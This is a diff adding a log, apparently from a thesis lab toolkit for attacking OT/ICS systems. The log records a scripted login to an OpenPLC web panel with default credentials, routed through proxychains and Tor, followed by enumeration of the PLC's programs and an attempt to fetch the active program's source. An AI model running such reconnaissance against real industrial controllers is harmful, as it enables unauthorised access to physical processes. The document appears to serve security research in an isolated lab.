@@ -1,0 +1,42 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  OpenPLC - Lectura del programa activo
+======================================================================
+  Fecha      : 2026-10-12 13:52:39
+  Objetivo   : 192.168.10.10:8080 (openplc:openplc)
+  MITRE ICS  : T0888, T0845
+======================================================================
+$ proxychains python3 -m modules._cli.openplc_cli get_current_program --target 192.168.10.10 --port 8080 --user openplc --password openplc
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[*] POST http://192.168.10.10:8080/login  (usuario=openplc)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 302
+[+] Sesión establecida.
+[*] GET http://192.168.10.10:8080/dashboard  (para localizar el programa activo)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 200
+    -> Programa activo (según /dashboard): 'UPLOAD-RUN-PoC'
+[*] GET http://192.168.10.10:8080/programs
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 200
+    (HTML volcado a /ataques/work/debug_192.168.10.10_1791813160_programs.html)
+    (HTML volcado a /ataques/work/debug_192.168.10.10_1791813160_dashboard.html)
+[debug] parser build 2026-10-12b (table_id-first)
+[debug] fila -> table_id=20, celdas=['UPLOAD-RUN-PoC', '925540.st', 'Oct 12, 2026 - 01:52PM']
+[debug] fila -> table_id=18, celdas=['SensoresModbus', 'programa_sensores.st', 'Oct 12, 2026 - 12:56PM']
+
+    Ref                  | Name                | Description          | File                   | Fecha        | Activo
+    ---------------------+---------------------+----------------------+------------------------+--------------+-------
+    20                   | UPLOAD-RUN-PoC      |                      | 925540.st              | Oct 12, 2026 |   *
+    18                   | SensoresModbus      |                      | programa_sensores.st   | Oct 12, 2026 | 
+
+[+] Programa activo: 'UPLOAD-RUN-PoC' (fichero='925540.st')
+[*] GET http://192.168.10.10:8080/st-files/925540.st  (único endpoint plausible)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 404 (207 bytes)
+[-] Este fork de OpenPLC no expone el .st por HTTP (confirmado contra
+    webserver.py del commit b5d4135). Guardo metadatos como evidencia.
+[+] Metadatos del programa activo guardados en /ataques/work/current_192.168.10.10_1791813160_925540.st.metadata.txt
+[=] Código de salida: 0
